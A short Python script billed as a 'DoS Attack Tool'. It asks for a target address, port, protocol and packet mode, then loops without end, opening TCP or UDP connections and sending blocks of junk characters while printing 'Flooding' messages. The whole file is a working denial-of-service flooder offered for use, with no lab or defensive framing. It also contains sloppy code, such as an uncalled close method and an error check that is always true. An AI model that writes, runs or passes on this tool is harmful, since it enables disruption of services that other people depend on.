import socket,random,sys

print("""Welcome to Moihack DoS Attack Tool Reloaded
Command syntax is Target -Port Number -Protocol[TCP/UDP] -Random Packet Creation[On/Off]
Exaple: 192.168.1.1 -80 -tcp -on
Please enter a valid command:""")
command=input().split(' -')

Data="qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
Target=command[0]
Port=int(command[1])
Protocol=command[2]
Rap=command[3]
Adr=(Target,Port)

while True:
    if Protocol =='TCP' or Protocol == 'tcp' or Protocol == 'Tcp' or Protocol == 't':
        Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    elif Protocol =='UDP' or Protocol == 'udp' or Protocol == 'Udp' or Protocol == 'u':
        Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    Sock.connect(Adr)
    if Rap=='ON' or Rap=='On' or Rap=='on':
        Bytes=(Data*random.randrange(16,64))
        BytesEnc=str.encode(Bytes)
    elif Rap=='OFF' or Rap=='Off' or Rap=='off':
        Bytes=(Data*64)
        BytesEnc=str.encode(Bytes)
    Sock.sendall(BytesEnc)
    
    print('Flooding {0} in port {1} with {2} bytes of data'.format(Target, Port, sys.getsizeof(BytesEnc)))
    if socket.error:
        Sock.shutdown(socket.SHUT_RDWR)
        Sock.close
        del Sock
                             
                     
        
                     
                   
